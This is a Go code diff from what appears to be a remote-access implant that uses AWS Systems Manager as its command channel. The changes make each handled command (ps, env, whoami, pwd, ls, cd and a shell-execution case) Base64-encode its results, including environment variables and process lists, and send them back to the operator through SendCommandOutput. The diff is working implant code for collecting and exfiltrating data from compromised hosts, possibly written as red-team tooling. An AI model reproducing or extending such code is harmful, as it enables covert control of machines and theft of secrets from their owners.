@@ -29,20 +29,26 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 	switch arrCommandStr[0] {
 	case "ps":
 		procs := implantps.Ps()
-		fmt.Println(procs)
 		fmt.Println(wd.WorkingDir())
+		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(strings.Join(procs[:], "\n")))
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 	case "env":
 		data := implantenv.Env()
 		fmt.Println(data)
 		fmt.Println(wd.WorkingDir())
+		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data))
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 	case "whoami":
-		data, _ := whoami.Whoami()
-		fmt.Println(data)
+		user, _ := whoami.Whoami()
 		fmt.Println(wd.WorkingDir())
+		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(user.Username))
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 	case "pwd":
 		data, _ := pwd.Pwd()
 		fmt.Println(data)
 		fmt.Println(wd.WorkingDir())
+		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data))
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 	case "ls":
 		var path string
 		if len(arrCommandStr) == 1 {
@@ -54,6 +60,8 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 		data := strings.Join(list, "\n")
 		fmt.Println(data)
 		fmt.Println(wd.WorkingDir())
+		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data))
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 	case "cat":
 		data := cat.Cat(arrCommandStr[1])
 		fmt.Println(data)
@@ -64,6 +72,8 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 		if len(arrCommandStr) > 1 {
 			os.Chdir(arrCommandStr[1])
 			fmt.Println(wd.WorkingDir())
+			awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(wd.WorkingDir()))
+			awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 		}
 		return nil
 	case "kill":
@@ -81,6 +91,8 @@ func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managed
 		}
 		fmt.Println(out.String())
 		fmt.Println(wd.WorkingDir())
+		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(out.String()))
+		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
 		return nil
 	}
 	return nil
